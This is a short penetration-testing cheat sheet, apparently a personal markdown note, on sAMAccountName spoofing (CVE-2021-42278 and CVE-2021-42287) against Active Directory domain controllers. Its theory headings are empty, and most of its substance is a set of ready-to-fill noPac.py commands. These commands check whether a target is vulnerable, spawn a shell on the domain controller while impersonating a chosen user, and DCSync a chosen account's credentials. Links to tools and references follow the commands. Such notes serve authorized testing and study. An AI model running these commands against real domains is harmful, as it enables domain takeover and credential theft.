---
Primary_category: "[[kerberos]]"
title: SAMACCOUNTNAME SPOOFING
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[KERBEROS]]

#### *Theory*

##### *CVE-2021-42278*

##### *CVE-2021-42287*

---

#### *Abusing - UNIX-like*

##### *Manual Workflow → KRBrelayx + Impacket*

##### *NoPac.py*

> ***[NoPac.py](https://github.com/Ridter/noPac)***

###### *Check whether a Target is vulnerable or not*

```bash
python3 scanner.py -dc-ip '<TARGET>' '<DOMAIN>/<USER>:<PASSWD>'
```

###### *Abusing Unpatched Target to get a Shell*

> **`-shell`**

```bash
python3 noPac.py -dc-ip '<TARGET>' -use-ldap --impersonate '<USER_TO_IMPERSONATE>' -shell '<DOMAIN>/<USER>:<PASSWD>'
```

###### *Abusing Unpatched Target to DCSync a certain User Account*

> **`-dump`**

```bash
python3 noPac.py -dc-ip '<TARGET>' -use-ldap --impersonate '<USER_TO_IMPERSONATE>' -dump -just-dc-user '<USER_TO_DCSYNC>' '<DOMAIN>/<USER>:<PASSWD>'
```

---

#### *Abusing - Windows*

##### *Manual Workflow → PowerMad + Rubeus + Mimikatz*

> ***[Reference](https://x.com/snovvcrash/status/1471829627765239816)***

![[SAMACCOUNTNAME SPOOFING-20251028160648696.webp|400]]

> ***Zoom in***

##### *noPac*

> ***[noPac](https://github.com/cube0x0/noPac)***

---

#### *References*

***[The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)***